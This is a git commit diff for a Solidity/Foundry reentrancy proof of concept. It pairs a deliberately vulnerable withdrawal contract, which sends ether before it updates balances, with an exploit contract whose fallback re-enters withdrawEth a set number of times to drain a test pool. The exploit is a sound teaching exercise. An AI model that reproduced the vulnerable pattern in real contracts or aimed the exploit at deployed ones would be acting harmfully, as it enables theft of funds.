33d2b5884d611656a767d64ef8f63825e9576344
Varun Verma <varunverma855@gmail.com>
2022-11-27 17:43:15 -0500

    Reentrancy PoC

--- src/1 - Reentrancy.sol
+++ src/1 - Reentrancy.sol
@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
+
 import "forge-std/Test.sol";
 
 contract ReentrancyVuln {
@@ -13,27 +14,30 @@ contract ReentrancyVuln {
         uint256 amountToWithdraw = balances[msg.sender];
         (bool success,) = payable(msg.sender).call{value: amountToWithdraw}("");
         require(success);
-
         // check effects fail
         balances[msg.sender] -= amountToWithdraw;
     }
 }
 
 contract ExploitReentrancy {
+    uint256 public times_reentered = 0;
+    uint256 public times_to_reenter;
 
-    uint public times_to_reenter;
-
-    function withdrawEthFromVulnContract(address reentrant_contract) public {
-        (bool success, ) = reentrant_contract.call(abi.encodeWithSignature("withdrawEth()"));
+    function withdrawEthFromVulnContract(address reentrant_contract, uint256 _times_to_reenter) public {
+        times_to_reenter = _times_to_reenter;
+        (bool success,) = reentrant_contract.call(abi.encodeWithSignature("withdrawEth()"));
         // require(success);
     }
 
     function printBalance() public {
         console.log(address(this).balance);
     }
-    fallback() external payable {
-        console.log("Fallback invoked, balance of contract is now:", address(this).balance / 1e18, "Ether");
-        (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));    
 
+    fallback() external payable {
+        if (times_reentered < times_to_reenter) {
+            console.log("Fallback invoked, balance of contract is now:", address(this).balance / 1e18, "Ether");
+            times_reentered = times_reentered + 1;
+            (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
+        }
     }
 }
--- test/1 - Reentrancy.t.sol
+++ test/1 - Reentrancy.t.sol
@@ -7,21 +7,26 @@ import "../src/1 - Reentrancy.sol";
 contract CounterTest is Test {
     ReentrancyVuln public vulnContract;
     ExploitReentrancy public exploiter;
+    uint public ethInPool = 5 ether;
+    uint public attackerGivenEth = 1 ether;
 
     function setUp() public {
         vulnContract = new ReentrancyVuln();
         exploiter = new ExploitReentrancy();
 
-        vm.deal(address(0x7), 5 ether);
+        vm.deal(address(0x7), ethInPool);
         vm.prank(address(0x7));
-        vulnContract.giveEth{value: 5 ether}();
+        vulnContract.giveEth{value: ethInPool}();
 
-        vm.deal(address(exploiter), 1 ether);
+        vm.deal(address(exploiter), attackerGivenEth);
         vm.prank(address(exploiter));
-        vulnContract.giveEth{value: 1 ether}();
+        vulnContract.giveEth{value: attackerGivenEth}();
     }
 
     function testExploit() public {
-        exploiter.withdrawEthFromVulnContract(address(vulnContract));
+        uint256 times_to_reenter = address(vulnContract).balance / attackerGivenEth;
+        console.log("Times to re enter", times_to_reenter);
+        exploiter.withdrawEthFromVulnContract(address(vulnContract), times_to_reenter);
+        console.log("Exploit finished, attacker balance is now", address(vulnContract).balance / 1e18, "ether");
     }
 }
